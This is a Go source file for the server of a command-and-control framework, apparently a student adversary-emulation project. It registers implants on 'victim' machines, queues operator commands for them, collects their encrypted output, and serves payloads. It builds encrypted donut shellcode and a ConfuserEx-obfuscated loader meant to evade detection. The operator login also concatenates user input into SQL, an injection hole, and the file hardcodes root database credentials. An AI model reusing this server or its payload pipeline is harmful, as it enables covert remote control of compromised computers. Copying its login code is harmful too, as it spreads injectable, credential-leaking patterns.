package main

import (
	"crypto/sha256"
	"database/sql"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"sync"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

var db *sql.DB

func main() {
	var err error
	db, err = sql.Open("mysql", "root:lol.exe1@tcp(127.0.0.1:3306)/aef")
	if err != nil {
		panic(err)
	}

	var socket = ":8081"
	http.HandleFunc("/registerNewImplant", registerNewImplant)
	http.HandleFunc("/fetchCommand", fetchCommand)
	http.HandleFunc("/fetchOutput", fetchOutput)
	http.HandleFunc("/getClients", getClients)
	http.HandleFunc("/agents/windows/powershell", powerShellImplant)
	http.HandleFunc("/agents/windows/cs", windowsImplant)
	http.HandleFunc("/generate/windows/implant", generateImplant)
	http.HandleFunc("/getStoredOutput", getStoredOutput)
	http.HandleFunc("/operators/register", registerOperatorHandler)
	http.HandleFunc("/operators/login", loginOperatorHandler)

	fmt.Println("Listening on: " + socket)

	err = http.ListenAndServe(socket, nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}

func generateImplant(w http.ResponseWriter, r *http.Request) {
	var cmd *exec.Cmd
	fmt.Println("Hit, generating shellcode...")
	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Implant.cs F:\\capstone-adversary-emulation-tool\\Implementation\\Implant\\Modules\\ExecuteAssembly.cs && F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\donut.exe -a 2 --input:F:\\capstone-adversary-emulation-tool\\Implementation\\donut\\Implant.exe --output:F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin")
	} else {
		cmd = exec.Command("/bin/sh", "-c", "mcs -out:/tmp/Implant.exe /mnt/f/capstone-adversary-emulation-tool/Implementation/Implant/Implant.cs && /mnt/f/capstone-adversary-emulation-tool/Implementation/donut/donut --input:/tmp/Implant.exe --output:/tmp/implant.bin")
	}

	err := cmd.Run()

	if err != nil {
		log.Fatal("Error: ", err)
	}

	fmt.Println("Encrypting the Shellcode with: AES-256 -> XOR -> Base64")
	fmt.Println("python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cryptocutter.py -f F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\implant.bin -o F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin")
	} else {
		cmd = exec.Command("")
	}

	output, err2 := cmd.Output() // Capture the output of the command
	if err2 != nil {
		log.Fatal("Error: ", err2)
	} else {
		fmt.Println(string(output)) // Print the output
	}

	fmt.Println("Shellcode generated, compiling loader...")
	fmt.Println("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /out:F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader\\Loader.cs")
	}

	err3 := cmd.Run()
	if err3 != nil {
		log.Fatal("Error: ", err3)
	}

	fmt.Println("Encrypting the Loader now...")
	fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "F:\\capstone-adversary-emulation-tool\\Implementation\\neo-ConfuserExbin\\Confuser.CLI.exe F:\\capstone-adversary-emulation-tool\\Implementation\\Loader.exe -o F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\")
	}

	output, err4 := cmd.Output() // Capture the output of the command
	if err4 != nil {
		log.Fatal("Error: ", err4)
	} else {
		fmt.Println(string(output)) // Print the output
	}

	fmt.Println("Loader ready, serving for download...")
	fmt.Println("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
	file, err := os.Open("F:\\capstone-adversary-emulation-tool\\Implementation\\encrypted_loader\\Loader.exe")
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	defer file.Close()

	// Set the appropriate headers for download
	w.Header().Set("Content-Disposition", "attachment; filename=Loader.exe")
	w.Header().Set("Content-Type", "application/octet-stream")

	// Copy the file contents to the response writer
	io.Copy(w, file)
}

type Agent struct {
	Code string `json:"Code"`
}

func windowsImplant(w http.ResponseWriter, r *http.Request) {
	fmt.Println("Agent getting downloaded")
	filepath := "F:\\capstone-adversary-emulation-tool\\Implementation\\OutputShellcode\\implant.bin"
	if _, err := os.Stat(filepath); os.IsNotExist(err) {
		fmt.Println("File does not exist:", err)
		http.Error(w, "File not found.", http.StatusNotFound)
		return
	}
	http.ServeFile(w, r, filepath)

	fmt.Println("Cleaning loader...")
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "python F:\\capstone-adversary-emulation-tool\\Implementation\\Encryption\\Cleaner.py")
	}

	err := cmd.Run()
	if err != nil {
		log.Fatal("Error: ", err)
	}
}

func powerShellImplant(w http.ResponseWriter, r *http.Request) {
	filePath := "implants/windows/powershell/agent.ps1"

	if r.Method == http.MethodPost {
		var agent Agent
		err := json.NewDecoder(r.Body).Decode(&agent)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}
		decoded, err := base64.StdEncoding.DecodeString(agent.Code)
		if err != nil {
			http.Error(w, "Failed to decode base64 string", http.StatusBadRequest)
			return
		}
		agent.Code = string(decoded)
		err = ioutil.WriteFile(filePath, []byte(agent.Code), 0644)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
	} else if r.Method == http.MethodGet {
		fmt.Println("Hit to download powershell script")
		http.ServeFile(w, r, filePath)
	} else {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
	}
}

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

func loginOperatorHandler(w http.ResponseWriter, r *http.Request) {
	// Decode JSON request body into LoginRequest struct
	decoder := json.NewDecoder(r.Body)
	var loginRequest LoginRequest
	err := decoder.Decode(&loginRequest)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Hash the password
	salt := loginRequest.Username
	password := []byte(loginRequest.Password + salt)
	hashedPassword := sha256.Sum256(password)
	loginRequest.Password = hex.EncodeToString(hashedPassword[:])

	// Print out the username and password of the user
	fmt.Printf("user %s with password %s wants to log in\n", loginRequest.Username, loginRequest.Password)

	// Prepare the SQL statement
	query := "SELECT COUNT(*) FROM Operator_Login WHERE username = '" + loginRequest.Username + "' AND password = '" + loginRequest.Password + "';"
	fmt.Println(query)

	// Query the Operator_Login table to check if the user exists and if the hash value matches
	rows, err := db.Query(query)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		fmt.Println(err)
		return
	}
	defer rows.Close()

	// Get the result of the query
	var count int
	for rows.Next() {
		if err := rows.Scan(&count); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			fmt.Println(err)
			return
		}
	}

	// Send response based on whether the user exists and if the hash value matches
	if count > 0 {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("Login successful"))
		fmt.Println("User will be logged in")
	} else {
		w.WriteHeader(http.StatusUnauthorized)
		w.Write([]byte("Invalid username or password"))
		fmt.Println("Invalid username or password")
	}

}

type OperatorRegister struct {
	FirstName   string `json:"firstName"`
	LastName    string `json:"lastName"`
	Username    string `json:"username"`
	Password    string `json:"password"`
	Email       string `json:"email"`
	PhoneNumber string `json:"phoneNumber"`
}

func registerOperatorHandler(w http.ResponseWriter, r *http.Request) {
	// Decode JSON request body into OperatorRegister struct
	decoder := json.NewDecoder(r.Body)
	var operator OperatorRegister
	err := decoder.Decode(&operator)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// Hash the password
	salt := operator.Username
	password := []byte(operator.Password + salt)
	hashedPassword := sha256.Sum256(password)
	operator.Password = hex.EncodeToString(hashedPassword[:])
	fmt.Printf(operator.Password)

	// Prepare the SQL statement for inserting operator data
	stmt, err := db.Prepare("INSERT INTO Operator_Login (username, password, date_registered, first_name, last_name, email, phone_number, operator_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?)")
	if err != nil {
		panic(err.Error())
	}
	defer stmt.Close()

	// Get the current date for date_registered field
	currentDate := time.Now().Format("2006-01-02")

	// Execute the prepared statement with operator data
	result, err := stmt.Exec(operator.Username, operator.Password, currentDate, operator.FirstName, operator.LastName, operator.Email, operator.PhoneNumber, 1)
	if err != nil {
		panic(err.Error())
	}

	// Get the ID of the inserted operator
	id, err := result.LastInsertId()
	if err != nil {
		panic(err.Error())
	}

	// Print out the operator information
	fmt.Println("First Name:", operator.FirstName)
	fmt.Println("Last Name:", operator.LastName)
	fmt.Println("Username:", operator.Username)
	fmt.Println("Password:", operator.Password)
	fmt.Println("Email:", operator.Email)
	fmt.Println("Phone Number:", operator.PhoneNumber)

	fmt.Println("Operator " + strconv.FormatInt(id, 10) + " registered successfully")

	// Send response
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Operator " + strconv.FormatInt(id, 10) + " registered successfully"))
}

// Define a structure above to handle JSON request/responses to list the victims that have connected to the database.
type ListDevices struct {
	Username        string `json:"Victim.username"`
	Network         string `json:"Network.ip_address"`
	OperatingSystem string `json:"Operating_System.name"`
	CPU             string `json:"CPU.architecture"`
	GPU             string `json:"GPU.information"`
	RAM             string `json:"RAM.amount"`
	Storage         string `json:"Storage.amount"`
}

// Define a Method for the Operator to see the list of implants connected
func getClients(w http.ResponseWriter, r *http.Request) {
	// Define query string to perform on the database
	sqlQuery := "SELECT Victim.username, Network.ip_address, Operating_System.name, CPU.architecture, GPU.information, RAM.amount, Storage.amount " + "FROM Victim " + "JOIN Network ON Victim.id = Network.victim_id " + "JOIN Operating_System ON Victim.id = Operating_System.victim_id " + "JOIN CPU ON Victim.id = CPU.victim_id " + "JOIN GPU ON Victim.id = GPU.victim_id " + "JOIN RAM ON Victim.id = RAM.victim_id " + "JOIN Storage ON Victim.id = Storage.victim_id"

	// Perform query using the db open connection to MySQL
	results, err := db.Query(sqlQuery)
	if err != nil {
		log.Fatal(err)
	}

	defer results.Close()

	var listDevices []ListDevices

	// For earch result in the result set of the query, append them into the ListDevices structure
	for results.Next() {
		var ld ListDevices
		err = results.Scan(&ld.Username, &ld.Network, &ld.OperatingSystem, &ld.CPU, &ld.GPU, &ld.RAM, &ld.Storage)
		if err != nil {
			panic(err.Error())
		}
		listDevices = append(listDevices, ld)
	}

	// Now that we have the list of victims in listDevices, marshal the structure to JSON
	jsonData, err := json.Marshal(listDevices)
	if err != nil {
		panic(err.Error())
	}

	// Send the response which will contain the JSON for all the victims connected as an item list
	w.Header().Set("Content-Type", "application/json")
	w.Write(jsonData)

	fmt.Println(string(jsonData))

	// Close the DB connection
	defer results.Close()

	fmt.Println("Success!")
}

// Much like List Devices struct, we define one more complete to register victims
type Device struct {
	Name            string `json:"Name"`
	ID              string `json:"ID"`
	Username        string `json:"Username"`
	OperatorID      int    `json:"OperatorID"`
	CPUArchitecture string `json:"CPUArchitecture"`
	CPUInfo         string `json:"CPUInfo"`
	RAMInfo         int    `json:"RAMInfo"`
	Storage         int    `json:"Storage"`
	OSName          string `json:"OSName"`
	NetworkInfo     string `json:"NetworkInfo"`
	CurrentDate     string `json:"CurrentDate"`
}

// On hit, take the request and perform actions to then register it to the databas
func registerNewImplant(w http.ResponseWriter, r *http.Request) {

	// First, we receive the response which will be JSON data, unmarshall it and put it in the Device struct
	defer r.Body.Close()
	var device Device
	decoder := json.NewDecoder(r.Body)
	err := decoder.Decode(&device)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	// After the data is ready, we set a list of prepared statements in order to insert the data from the JSON request into the database
	stmt, err := db.Prepare("INSERT INTO Victim (username, operator_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	res, err := stmt.Exec(device.Username, device.OperatorID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	victimID, err := res.LastInsertId()
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO CPU (architecture, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.CPUArchitecture, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO GPU (information, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.CPUInfo, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO RAM (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.RAMInfo, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Storage (amount, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.Storage, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Operating_System (name, victim_id) VALUES (?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.OSName, victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	stmt, err = db.Prepare("INSERT INTO Network (ip_address, mac_address, victim_id) VALUES (?, ?, ?)")
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}
	defer stmt.Close()

	_, err = stmt.Exec(device.NetworkInfo, "", victimID)
	if err != nil {
		log.Println(err.Error())
		http.Error(w, "Failed to register implant", http.StatusInternalServerError)
		return
	}

	// After all items are registered, we response with a success message
	w.WriteHeader(http.StatusOK)
	w.Write([]byte("New implant registered successfully"))
}

// Define a structure to handle the commands which the Operator will send to the implant
type Command struct {
	Input       string `json:"Input"`
	ImplantUser string `json:"ImplantUser"`
	Operator    string `json:"Operator"`
	TimeToExec  string `json:"timeToExec"`
	Delay       string `json:"delay"`
	File        string `json:"File"`
	Command     string `json:"Command"`
}

// Because we have to wait for the implant to receive the command and actually run it, we need to store inside a Mutex so that it stays in memory
var (
	mu            sync.RWMutex
	storedCommand *Command
)

// Method for the operator to actually send the command to the implant
func fetchCommand(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Set the response content type to JSON
	w.Header().Set("Content-Type", "application/json")

	// Define a switch statement to handle GET or POST requests
	switch r.Method {
	case "POST":
		// If the request is a POST, which would ideally be the operator sending the command
		// Receive the request for the command, unmarshal it into the Command struct
		var command Command
		decoder := json.NewDecoder(r.Body)
		if err := decoder.Decode(&command); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		// With the Mutex, we store it in memory
		mu.Lock()
		storedCommand = &command
		mu.Unlock()

		w.WriteHeader(http.StatusOK)
		fmt.Println("Fetching command:", command.Input, command.File, "for Implant User:", command.ImplantUser, "From Operator:", command.Operator)

	case "GET":
		// If the request is a GET request, we unlock the Mutex and release the command for the implant
		mu.RLock()
		defer mu.RUnlock()

		// Since the command is basically "consumed", we check if there is a command that has not been released
		if storedCommand == nil {
			http.Error(w, "No command available", http.StatusNotFound)
			return
		}

		// If such command exists, unmarshal it so that we can send it to the impant
		jsonCommand, err := json.Marshal(storedCommand)
		if err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

		w.WriteHeader(http.StatusOK)

		// Write the JSON command to the response
		if _, err := w.Write(jsonCommand); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}

	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
}

// Define a structure to handle the output which the implant sends to the server
type Output struct {
	ImplantID    string `json:"ImplantId"`
	Operator     string `json:"OperatorId"`
	Output       string `json:"Output"`
	DateFromLast string `json:"DateFromLast"`
}

// Define the buffer that will store the XOR encrypted output
var outputBuffer []byte
var bufferMutex sync.Mutex

// This method will receive the output from the implant
func fetchOutput(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	// Upon receiving the output, read it and store the body
	body, err := ioutil.ReadAll(r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}

	fmt.Println("Received XOR encrypted output:", string(body))

	// Lock the mutex and save the body in the outputBuffer
	bufferMutex.Lock()
	outputBuffer = body
	bufferMutex.Unlock()
}

// This method will be for the Operator so that he can actually receive the output from the implant
func getStoredOutput(w http.ResponseWriter, r *http.Request) {
	// We first unlock the stored mutex which holdes the Output struct and put it inside a variable
	bufferMutex.Lock()
	output := outputBuffer
	bufferMutex.Unlock()

	fmt.Println(string(output))

	// Then we send off the XOR encrypted output for the Operator
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Write(output)
}
